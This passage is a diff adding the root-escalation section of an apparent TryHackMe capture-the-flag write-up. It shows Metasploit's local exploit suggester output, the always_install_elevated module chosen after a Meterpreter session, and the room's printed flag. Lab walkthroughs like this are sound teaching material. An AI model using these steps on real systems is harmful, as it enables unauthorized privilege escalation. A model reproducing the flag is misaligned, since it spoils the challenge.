@@ -147,4 +147,35 @@ And we have the user flag 🎉😎!
 
 Now we'll try to get root! A quick and dirty `getsystem` from `meterpreter` didn’t work, so I’ll have to get more inventive.
 
+We will do a Windows Privilege Escalation Awesome Scripts (WinPEAS). But again, no need to download anything since this kind of scripts are also available by default as Exploit Suggester.
+```
+msf6 exploit(windows/http/apache_tika_jp2_jscript) > search exploit suggester
 
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester
+
+
+Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
+```
+
+We need only to setup a session using set command and we can run it.
+![[Pasted image 20250731212042.png]]
+As we are lazy, let’s select the first provided:
+`use exploit/windows/local/always_install_elevated`
+
+That is the vulnerability for a regular user to install MSI files with high privileges. More info. Again, we need to setup SESSION and LHOST.
+![[Pasted image 20250731212140.png]]
+
+We run it and get in as an admin:
+![[Pasted image 20250731212216.png]]
+
+Voila!
+![[Pasted image 20250731212449.png]]
+
+`THM{3lev@t3D-4-pr1v35c!}`
+
+Congratulations 🎉😎!
